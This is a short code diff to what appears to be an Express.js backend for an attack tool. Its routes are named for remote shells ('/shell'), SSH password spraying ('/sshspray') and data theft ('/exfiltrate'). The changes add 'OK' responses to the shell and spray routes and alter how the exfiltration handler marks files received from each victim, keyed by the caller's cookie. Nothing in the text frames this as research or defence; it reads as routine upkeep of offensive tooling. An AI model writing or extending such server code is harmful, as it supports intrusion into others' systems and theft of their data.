@@ -71,6 +71,7 @@ app.get('/shell', (req, res)=>{
 			console.log(result);
 		});
 	});
+	res.send("OK");
 });
 
 app.get('/sshspray', (req, res)=>{
@@ -102,6 +103,7 @@ app.get('/sshspray', (req, res)=>{
 			console.log(result);
 		});
 	});
+	res.send("OK");
 });
 
 
@@ -191,7 +193,7 @@ app.post('/exfiltrate', (req, res)=>{
 			if (err) return console.log(err);
 		});
 
-		json_output[req.headers.cookie][file_name] = "1";
+		json_output[req.headers.cookie][Object.keys(json_output[req.headers.cookie])[0]] = "1";
 
 		let buff2 = new Buffer(JSON.stringify(json_output));
 		let b64_final = buff2.toString('base64');
